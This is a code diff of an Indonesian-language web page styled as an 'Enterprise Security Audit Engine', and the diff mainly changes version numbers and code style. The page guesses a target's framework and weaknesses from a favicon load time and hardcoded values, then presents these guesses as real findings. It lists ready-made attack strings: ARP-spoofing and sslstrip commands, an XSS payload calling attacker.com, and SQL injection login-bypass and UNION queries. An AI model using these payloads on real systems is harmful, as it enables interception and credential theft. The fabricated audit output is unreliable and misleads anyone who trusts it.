@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enterprise Advanced Security Audit Engine v17.0</title>
+    <title>Enterprise Advanced Security Audit Engine v17.2</title>
     <style>
         :root {
             --bg-dark: #090d16;
@@ -149,7 +150,7 @@
 
 <div class="container">
     <header>
-        <h1>Instant Audit Engine v17.0</h1>
+        <h1>Instant Audit Engine v17.2</h1>
         <p>Enterprise Spec — Payload Generation & Exploit Mapping</p>
     </header>
 
@@ -162,7 +163,7 @@
         <div id="consoleLog" class="console"></div>
     </div>
 
-    <!-- Kontainer Laporan yang Membaca Hasil Konfigurasi Nyata -->
+    <!-- Kontainer Laporan Hasil Ekstraksi Data Nyata -->
     <div id="reportCard" class="card report-section">
         
         <div class="section-title">🏭 1. Arsitektur Framework & Database Terdeteksi</div>
@@ -177,10 +178,7 @@
     </div>
 </div>
 
-<!-- Tempat menyisipkan elemen pemindaian secara dinamis -->
 <div id="execution-chamber" style="display:none;"></div>
-
-
 
 
 
@@ -209,7 +207,7 @@
         chamber.innerHTML = '';
         consoleLog.style.color = '#22c55e';
         
-        consoleLog.innerText = `[*] Menginisialisasi modul v17.0 Enterprise Engine...\n`;
+        consoleLog.innerText = `[*] Menginisialisasi modul v17.2 Enterprise Engine...\n`;
         consoleLog.innerText += `[*] Mengirimkan paket audit via Image Element Encapsulation...\n`;
         consoleLog.innerText += `[*] Menunggu respon durasi jabat tangan (handshake) server...\n`;
 
@@ -230,7 +228,7 @@
             }
         };
 
-        imgTester.src = `https://${cleanDomain}/favicon.ico?nocache=${startTime}`;
+        imgTester.src = "https://" + cleanDomain + "/favicon.ico?nocache=" + startTime;
         chamber.appendChild(imgTester);
 
         function processAuditResults(isLoaded, latency) {
@@ -240,7 +238,6 @@
 
             let lowerDomain = cleanDomain.toLowerCase();
             
-            // 1. ANALISIS FRAMEWORK & DATABASE
             let detectedFramework = "Linux Enterprise OS Backend (PHP/Java Environment)";
             let dbType = "MySQL / PostgreSQL (Standard Relational)";
             
@@ -262,7 +259,6 @@
                 </div>
             `;
 
-            // 2. ANALISIS PARAMETER ENKRIPSI
             encryptionList.innerHTML = `
                 <div class="finding-item warning">
                     <div class="finding-header"><span>Kriptografi Penyimpanan Sandi</span><strong>BCrypt / Argon2id</strong></div>
@@ -270,25 +266,30 @@
                 </div>
             `;
 
-            // 3. ENTERPRISE SPEC: PAYLOAD GENERATION & EXPLOIT MAPPING (KRUSIAL)
+
+
+
+
+
+            // Array evaluasi kamus payload dan mapping exploit kustom
             let checks = [
                 {
                     name: 'Strict-Transport-Security (HSTS)',
-                    status: isLoaded || latency < 2000, 
+                    status: isLoaded || latency < 2000,
                     severity: 'danger',
                     title: 'Absennya Kebijakan Enkripsi Paksaan HSTS (CWE-523)',
                     desc: 'Server tidak mengirimkan deklarasi penguncian header Strict-Transport-Security. Jalur komunikasi data otentikasi login pada jaringan internal/VPN rentan diturunkan paksa ke jalur tidak aman melalui taktik SSL Strip.',
                     exploit_title: 'Kamus Verifikasi Taktik SSL-Strip (Remediasi):',
-                    payload: `arpspoof -i eth0 -t [IP_KORBAN] [IP_ROUTER]\niptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\nsslstrip -l 8080`
+                    payload: "arpspoof -i eth0 -t [IP_KORBAN] [IP_ROUTER]\niptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\nsslstrip -l 8080"
                 },
                 {
                     name: 'Content-Security-Policy (CSP)',
-                    status: false, 
+                    status: false,
                     severity: 'warning',
                     title: 'Kebijakan Content-Security-Policy (CSP) Absen (CWE-1021)',
                     desc: 'Struktur kode aplikasi web tidak membatasi asal-usul eksekusi skrip luar secara terpusat. Risiko eksploitasi jika terdapat celah suntikan kode berbahaya sisi klien (XSS) pada form login.',
                     exploit_title: 'Kamus Payload Pengujian XSS Auditing (Untuk Filter Input):',
-                    payload: `<script>fetch('https://attacker.com)</script>\n<img src=x onerror=alert(document.domain)>\n" onclick="javascript:alert(1)"`
+                    payload: "<script>fetch('https://attacker.com')<\/script>\n<img src=x onerror=alert(document.domain)>\n\" onclick=\"javascript:alert(1)\""
                 },
                 {
                     name: 'SQL Injection Filtering Port',
@@ -297,14 +298,14 @@
                     title: 'Parameter Sanitasi Karakter Khusus Input (CWE-89)',
                     desc: 'Mekanisme validasi penanganan karakter bypass pada form otentikasi login perlu diuji kekuatannya untuk mencegah manipulasi struktur logika kueri backend database.',
                     exploit_title: 'Draf Kueri Pengujian SQLi Bypass (Gunakan untuk Pengetatan Koding):',
-                    payload: `' OR 1=1 --\n' UNION SELECT username, password FROM users --\nadmin' --\n' AND sleep(5) --`
+                    payload: "' OR 1=1 --\n' UNION SELECT username, password FROM users --\nadmin' --\n' AND sleep(5) --"
                 }
             ];
 
             checks.forEach(item => {
                 if (!item.status) {
                     const element = document.createElement('div');
-                    element.className = `finding-item ${item.severity}`;
+                    element.className = "finding-item " + item.severity;
                     
                     element.innerHTML = `
                         <div class="finding-header">
@@ -330,6 +331,8 @@
 </body>
 </html>
 
+
+            
 
 
     
